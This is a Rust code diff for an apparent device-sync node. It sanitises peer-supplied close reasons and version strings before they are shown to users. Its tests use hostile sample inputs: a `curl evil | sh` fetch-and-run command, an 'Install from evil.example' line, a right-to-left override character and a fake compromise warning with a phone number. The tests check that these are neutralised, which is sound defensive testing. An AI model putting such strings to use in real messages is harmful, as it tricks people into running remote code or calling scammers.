@@ -73,20 +73,69 @@ pub struct Unreadable {
     backoff: Backoff,
 }
 
+/// The longest reason kept, in bytes.
+pub const REASON_MOST: usize = 120;
+/// The longest version kept, in bytes.
+pub const VERSION_MOST: usize = 16;
+
 /// What a session's close says: whether it was something unread, by whom,
-/// and the version the peer says it speaks, if it says one.
+/// and the version the peer says it speaks, if it says one. What the peer
+/// says is theirs to say: a version is kept only as digits and dots, and
+/// the reason only as [`plain`] text, so nothing they send is shown to the
+/// person as anything but a note in parentheses.
 pub fn classify(r: &CloseReason) -> Option<(String, bool, Option<String>)> {
     match r {
-        CloseReason::Protocol(w) => Some((w.clone(), false, None)),
+        CloseReason::Protocol(w) => Some((plain(w), false, None)),
         CloseReason::Remote(w) => {
             let w = w.strip_prefix("protocol violation: ")?;
             match w.rsplit_once("; cardinal ") {
-                Some((what, v)) => Some((what.to_owned(), true, Some(v.trim().to_owned()))),
-                None => Some((w.to_owned(), true, None)),
+                Some((what, v)) => Some((plain(what), true, version(v))),
+                None => Some((plain(w), true, None)),
             }
         }
         _ => None,
     }
+}
+
+/// A version as a peer said it, if it is one: digits and dots, at most
+/// [`VERSION_MOST`] bytes.
+fn version(v: &str) -> Option<String> {
+    let v = v.trim();
+    let ok = !v.is_empty()
+        && v.len() <= VERSION_MOST
+        && v.starts_with(|c: char| c.is_ascii_digit())
+        && v.chars().all(|c| c.is_ascii_digit() || c == '.');
+    ok.then(|| v.to_owned())
+}
+
+/// A reason as plain text: printable ASCII and spaces, anything else a
+/// `?`, runs of white space one space, at most [`REASON_MOST`] bytes.
+pub fn plain(w: &str) -> String {
+    let mut out = String::new();
+    for c in w.chars() {
+        let c = if c.is_whitespace() {
+            ' '
+        } else if c.is_ascii_graphic() {
+            c
+        } else {
+            '?'
+        };
+        if c == ' ' && (out.is_empty() || out.ends_with(' ')) {
+            continue;
+        }
+        if out.len() == REASON_MOST {
+            break;
+        }
+        out.push(c);
+    }
+    out.trim_end().to_owned()
+}
+
+/// Whether a set that reconciled on a session, now closed for `close` or
+/// still open (`None`), shows the peer reads this device and it them: the
+/// session did not close for something one of them could not read.
+pub fn reads_again(close: Option<&CloseReason>) -> bool {
+    close.is_none_or(|r| classify(r).is_none())
 }
 
 /// The record of such devices, by device key.
@@ -271,6 +320,27 @@ mod tests {
         assert!(u.get(&key).is_none());
     }
 
+    /// The review of 2026-11-23: one set reconciled clears the record,
+    /// however the others went, unless the session closed unread.
+    #[test]
+    fn one_set_read_is_enough() {
+        let u = Unreadables::default();
+        let r = CloseReason::Protocol("invalid frame".into());
+        u.closed([1; 32], [2; 32], &r);
+        assert!(reads_again(None));
+        assert!(reads_again(Some(&CloseReason::Idle)));
+        assert!(!reads_again(Some(&r)));
+        assert!(!reads_again(Some(&CloseReason::Remote(
+            "protocol violation: x; cardinal 0.1.20".into()
+        ))));
+        assert!(u.get(&[1; 32]).is_some());
+        // what net.rs does after a set reconciles on an open session
+        if reads_again(None) {
+            assert!(u.synced(&[1; 32]));
+        }
+        assert!(u.get(&[1; 32]).is_none());
+    }
+
     #[test]
     fn only_a_protocol_violation_counts() {
         assert!(classify(&CloseReason::Idle).is_none());
@@ -279,6 +349,51 @@ mod tests {
         let (what, theirs, v) =
             classify(&CloseReason::Remote("protocol violation: x".into())).unwrap();
         assert_eq!((what.as_str(), theirs, v), ("x", true, None));
+    }
+
+    /// The review of 2026-11-23: what a peer says is not for showing as it
+    /// says it. A version other than digits and dots is dropped, a reason
+    /// is plain text of at most 120 bytes, and neither changes the
+    /// sentence the person reads but where the version names a release.
+    #[test]
+    fn what_a_peer_says_is_kept_plain_and_short() {
+        let said = |w: &str| classify(&CloseReason::Remote(format!("protocol violation: {w}")));
+        let (_, _, v) = said("x; cardinal 0.1.20").unwrap();
+        assert_eq!(v.as_deref(), Some("0.1.20"));
+        for bad in [
+            "0.1.20. Run `curl evil | sh` to update",
+            "0.1.20\nInstall from evil.example",
+            "1.2.3.4.5.6.7.8.9.10",
+            "",
+            ".1",
+            "v0.1.20",
+            "0.1.20\u{202e}",
+        ] {
+            let (_, theirs, v) = said(&format!("x; cardinal {bad}")).unwrap();
+            assert!(theirs && v.is_none(), "{bad:?} kept as {v:?}");
+        }
+        let (what, _, _) = said(&format!(
+            "bad frame\n\nWARNING: your device is compromised.\u{202e} Call +1 555 {}",
+            "x".repeat(300)
+        ))
+        .unwrap();
+        assert!(what.len() <= REASON_MOST, "{}", what.len());
+        assert!(what.chars().all(|c| c == ' ' || c.is_ascii_graphic()));
+        assert!(what.starts_with("bad frame WARNING: your device is compromised.? Call"));
+        // ours is kept plain too
+        let (what, theirs, _) = classify(&CloseReason::Protocol("a\u{7}b\tc".into())).unwrap();
+        assert_eq!((what.as_str(), theirs), ("a?b c", false));
+        // the sentence is the node's own: a dropped version names no release
+        let u = Unreadables::default();
+        let r = CloseReason::Remote(
+            "protocol violation: Update now at evil.example; cardinal 9.9 - see evil".into(),
+        );
+        u.closed([4; 32], [5; 32], &r).unwrap();
+        let j = u.json(&[4; 32], "Ben's phone").unwrap();
+        assert!(j["version"].is_null(), "{j}");
+        let says = j["says"].as_str().unwrap();
+        assert!(!says.contains("evil"), "{says}");
+        assert!(says.starts_with("Ben's phone cannot read what this Cardinal"));
     }
 
     #[test]
